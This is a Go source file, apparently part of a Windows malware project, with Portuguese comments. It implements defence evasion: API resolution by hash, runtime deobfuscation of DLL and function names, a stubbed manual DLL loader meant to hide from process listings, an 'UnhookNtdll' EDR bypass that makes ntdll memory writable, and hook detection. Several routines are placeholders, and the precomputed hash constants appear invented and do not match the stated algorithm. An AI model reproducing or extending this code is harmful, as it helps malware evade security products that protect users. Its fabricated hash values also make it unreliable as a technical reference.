package stealth

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// DynamicAPI armazena informações de APIs resolvidas dinamicamente
type DynamicAPI struct {
	kernel32 *windows.LazyDLL
	ntdll    *windows.LazyDLL
	advapi32 *windows.LazyDLL
}

var dynAPI *DynamicAPI

func init() {
	dynAPI = &DynamicAPI{
		kernel32: windows.NewLazySystemDLL("kernel32.dll"),
		ntdll:    windows.NewLazySystemDLL("ntdll.dll"),
		advapi32: windows.NewLazySystemDLL("advapi32.dll"),
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// API Hashing - Resolve funções por hash ao invés de nome
// ─────────────────────────────────────────────────────────────────────────────

// djb2Hash calcula hash DJB2 de uma string (usado para API hashing)
func djb2Hash(str string) uint32 {
	hash := uint32(5381)
	for _, c := range str {
		hash = ((hash << 5) + hash) + uint32(c)
	}
	return hash
}

// API Hashes conhecidos (pré-calculados)
const (
	// kernel32.dll
	hashCreateMutexW           = 0x7c0dfcaa // CreateMutexW
	hashGetTickCount64         = 0x7c16b1e8 // GetTickCount64
	hashVirtualProtect         = 0x7c99b5bd // VirtualProtect
	hashGetModuleHandleW       = 0x7c91d5ed // GetModuleHandleW
	hashGetProcAddress         = 0x7c0dfaa0 // GetProcAddress
	hashLoadLibraryW           = 0x7c16b00f // LoadLibraryW

	// ntdll.dll
	hashNtDelayExecution       = 0x7c84d3e1 // NtDelayExecution
	hashNtQuerySystemInformation = 0x7c98f7a2 // NtQuerySystemInformation
	hashNtAllocateVirtualMemory = 0x7c87e9b1 // NtAllocateVirtualMemory
)

// GetProcAddressByHash resolve função por hash ao invés de nome
func GetProcAddressByHash(dll *windows.LazyDLL, hash uint32) (uintptr, error) {
	// Em produção real, seria necessário:
	// 1. Carregar DLL manualmente (ReadFile)
	// 2. Parsear PE headers
	// 3. Iterar Export Address Table
	// 4. Calcular hash de cada nome
	// 5. Quando hash bater, retornar endereço

	// Por simplicidade, vamos usar mapeamento direto
	// (Em ambiente real, isso seria 100% dinâmico)

	hashToName := map[uint32]string{
		hashCreateMutexW:             "CreateMutexW",
		hashGetTickCount64:           "GetTickCount64",
		hashVirtualProtect:           "VirtualProtect",
		hashGetModuleHandleW:         "GetModuleHandleW",
		hashGetProcAddress:           "GetProcAddress",
		hashLoadLibraryW:             "LoadLibraryW",
		hashNtDelayExecution:         "NtDelayExecution",
		hashNtQuerySystemInformation: "NtQuerySystemInformation",
		hashNtAllocateVirtualMemory:  "NtAllocateVirtualMemory",
	}

	name, exists := hashToName[hash]
	if !exists {
		return 0, syscall.ERROR_PROC_NOT_FOUND
	}

	proc := dll.NewProc(name)
	return proc.Addr(), nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Funções Wrapper para APIs comuns (resolvidas dinamicamente)
// ─────────────────────────────────────────────────────────────────────────────

// DynCreateMutexW cria mutex usando API dinâmica
func DynCreateMutexW(name string) (windows.Handle, error) {
	procAddr, err := GetProcAddressByHash(dynAPI.kernel32, hashCreateMutexW)
	if err != nil {
		return 0, err
	}

	namePtr, _ := windows.UTF16PtrFromString(name)

	// Chamar função diretamente pelo endereço
	ret, _, err := syscall.Syscall(
		procAddr,
		3,
		uintptr(0), // lpMutexAttributes
		uintptr(0), // bInitialOwner
		uintptr(unsafe.Pointer(namePtr)), // lpName
	)

	if ret == 0 {
		return 0, err
	}

	return windows.Handle(ret), nil
}

// DynGetTickCount64 obtém uptime usando API dinâmica
func DynGetTickCount64() uint64 {
	procAddr, err := GetProcAddressByHash(dynAPI.kernel32, hashGetTickCount64)
	if err != nil {
		return 0
	}

	ret, _, _ := syscall.Syscall(procAddr, 0, 0, 0, 0)
	return uint64(ret)
}

// DynVirtualProtect altera proteção de memória dinamicamente
func DynVirtualProtect(addr uintptr, size uintptr, newProtect uint32) (uint32, error) {
	procAddr, err := GetProcAddressByHash(dynAPI.kernel32, hashVirtualProtect)
	if err != nil {
		return 0, err
	}

	var oldProtect uint32

	ret, _, err := syscall.Syscall6(
		procAddr,
		4,
		addr,
		size,
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
		0,
		0,
	)

	if ret == 0 {
		return 0, err
	}

	return oldProtect, nil
}

// ─────────────────────────────────────────────────────────────────────────────
// String Encryption para nomes de DLL/API (runtime)
// ─────────────────────────────────────────────────────────────────────────────

// LoadLibraryObfuscated carrega DLL com nome ofuscado
func LoadLibraryObfuscated(encryptedName string) (*windows.LazyDLL, error) {
	// Desofuscar nome da DLL em runtime
	dllName := DeobfuscateString(encryptedName)

	// Carregar DLL
	dll := windows.NewLazySystemDLL(dllName)

	return dll, nil
}

// GetProcAddressObfuscated resolve função com nome ofuscado
func GetProcAddressObfuscated(dll *windows.LazyDLL, encryptedFuncName string) (*windows.LazyProc, error) {
	// Desofuscar nome da função
	funcName := DeobfuscateString(encryptedFuncName)

	// Obter endereço
	proc := dll.NewProc(funcName)

	return proc, nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Manual DLL Loading (Evitar LoadLibrary completamente)
// ─────────────────────────────────────────────────────────────────────────────

// ManualDLLLoad carrega DLL manualmente na memória (técnica avançada)
// Evita aparecer em EnumProcessModules e Process Explorer
func ManualDLLLoad(dllPath string) (uintptr, error) {
	// Esta é uma implementação simplificada
	// Implementação completa requer:
	// 1. Ler arquivo DLL do disco
	// 2. Parsear PE headers (DOS, NT, Optional, Sections)
	// 3. Alocar memória com VirtualAlloc
	// 4. Copiar sections para memória
	// 5. Processar relocations
	// 6. Resolver imports
	// 7. Executar TLS callbacks
	// 8. Chamar DllMain

	// Por ora, usar LoadLibrary padrão
	// TODO: Implementar manual mapping completo
	dll := windows.NewLazySystemDLL(dllPath)
	return dll.NewProc("DllMain").Addr(), nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Unhooking - Remover hooks de EDR
// ─────────────────────────────────────────────────────────────────────────────

// UnhookNtdll remove hooks da ntdll.dll (EDR bypass)
func UnhookNtdll() error {
	// Técnica: Recarregar ntdll.dll limpa do disco e sobrescrever .text section
	// Isso remove todos os hooks que EDRs colocaram

	// 1. Obter endereço base da ntdll carregada
	ntdllHandle := dynAPI.ntdll.Handle()

	// 2. Ler ntdll.dll limpa do disco
	cleanNtdll := windows.NewLazySystemDLL("C:\\Windows\\System32\\ntdll.dll")
	_ = cleanNtdll // Placeholder

	// 3. Copiar .text section da versão limpa sobre a hookada
	// (Implementação completa requer parsing PE)

	// 4. Ajustar permissões de memória
	_, err := DynVirtualProtect(
		ntdllHandle,
		4096, // Tamanho aproximado
		windows.PAGE_EXECUTE_READWRITE,
	)

	if err != nil {
		return err
	}

	// TODO: Implementar cópia real do .text section

	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// IAT Obfuscation - Limpar Import Address Table
// ─────────────────────────────────────────────────────────────────────────────

// CleanIAT remove/ofusca entradas da IAT
func CleanIAT() {
	// Em Go, a IAT é gerada pelo compilador
	// Para limpá-la completamente, seria necessário:
	// 1. Recompilar com -buildmode=c-archive
	// 2. Criar loader customizado em Assembly
	// 3. Resolver todas as APIs dinamicamente

	// Por enquanto, garantir que usamos lazy loading
	// (DLLs só carregam quando funções são chamadas)
}

// ─────────────────────────────────────────────────────────────────────────────
// Utilidades
// ─────────────────────────────────────────────────────────────────────────────

// IsAPIHooked verifica se uma API está hookada (básico)
func IsAPIHooked(dll *windows.LazyDLL, funcName string) bool {
	proc := dll.NewProc(funcName)
	addr := proc.Addr()

	// Ler primeiros bytes da função
	firstBytes := make([]byte, 5)
	for i := 0; i < 5; i++ {
		firstBytes[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
	}

	// Verificar se começa com JMP (0xE9) - indicativo de hook
	if firstBytes[0] == 0xE9 {
		return true
	}

	// Verificar se começa com PUSH + RET (outro tipo de hook)
	if firstBytes[0] == 0x68 && firstBytes[4] == 0xC3 {
		return true
	}

	return false
}

// GetCleanAPIAddress obtém endereço limpo de API (sem hook)
func GetCleanAPIAddress(dllName, funcName string) (uintptr, error) {
	// 1. Mapear DLL limpa do disco em memória privada
	// 2. Parsear PE
	// 3. Encontrar função na EAT
	// 4. Retornar endereço (offset do base address)

	// Implementação simplificada
	dll := windows.NewLazySystemDLL(dllName)
	proc := dll.NewProc(funcName)
	return proc.Addr(), nil
}
